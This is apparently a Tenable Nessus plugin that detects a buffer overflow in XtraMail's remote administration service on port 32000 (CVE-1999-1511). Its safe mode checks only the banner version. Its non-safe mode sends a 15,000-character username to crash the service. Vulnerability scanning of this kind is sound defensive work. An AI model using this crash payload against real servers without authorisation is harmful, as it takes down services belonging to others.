#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if(description)
{
 script_id(10323);
 script_version ("$Revision: 1.24 $");
 script_cve_id("CVE-1999-1511");
 script_bugtraq_id(791);
 script_xref(name:"OSVDB", value:"251");
 
 script_name(english:"XtraMail Control Service Username Overflow");
 script_summary(english:"Attempts to crash the remote mail server");
 
 script_set_attribute(
   attribute:"synopsis",
   value:string(
     "The remote host is running a mail server with a remote buffer overflow\n",
     "vulnerability."
   )
 );
 script_set_attribute(
   attribute:"description", 
   value:string(
     "The remote host is running a version of XtraMail with a remote\n",
     "buffer overflow vulnerability. XtraMail includes a remote\n",
     "administration utility which listens on port 32000 for logins.\n",
     "Providing a username of over 15,000 characters causes a buffer\n",
     "overflow, which could allow a remote attacker to crash the service\n",
     "or potentially execute arbitrary code."
   )
 );
 script_set_attribute(
   attribute:"see_also",
   value:"http://archives.neohapsis.com/archives/ntbugtraq/1999-q3/0362.html"
 );
 script_set_attribute(
   attribute:"solution", 
   value:"Upgrade to the latest version of the software."
 );
 script_set_attribute(
   attribute:"cvss_vector", 
   value:"CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P"
 );
 script_end_attributes();

 script_family(english:"Misc.");
 script_category(ACT_MIXED_ATTACK); # mixed
 script_copyright(english:"This script is Copyright (C) 1999-2009 Tenable Network Security, Inc.");
 script_dependencie("find_service1.nasl", "sendmail_expn.nasl");
 script_require_ports(32000);
 exit(0);
}

#
# The script code starts here
#

include("global_settings.inc");

port = 32000;

if(safe_checks())
{
 if(!get_port_state(port))exit(0);
 soc = open_sock_tcp(port);
 if(!soc)exit(0);
 banner = recv_line(socket:soc, length:4096);
 close(soc);
 if(banner)
 {
  b = tolower(banner);
  if("xtramail" >< b)
  {
  if( ereg(pattern:".*1\.([0-9]|1[0-1])[^0-9].*",
   	string:b)
    )
    {
     data = "
Nessus reports this vulnerability using only information that was
gathered. Use caution when testing without safe checks enabled.";
     security_hole(port:port, extra: data);
    }
  }
 }
 exit(0);
}

if (report_paranoia < 2) exit(0);

if(get_port_state(port))
{
 soc = open_sock_tcp(port);
 if(soc)
 {
  s = recv_line(socket:soc, length:1024);
  if ( ! s ) exit(0);
  c = string("Username: ", crap(15000), "\r\n");
  send(socket:soc, data:c);
  s = recv_line(socket:soc, length:1024);
  if(!s)security_hole(port);
  close(soc);
 }
}
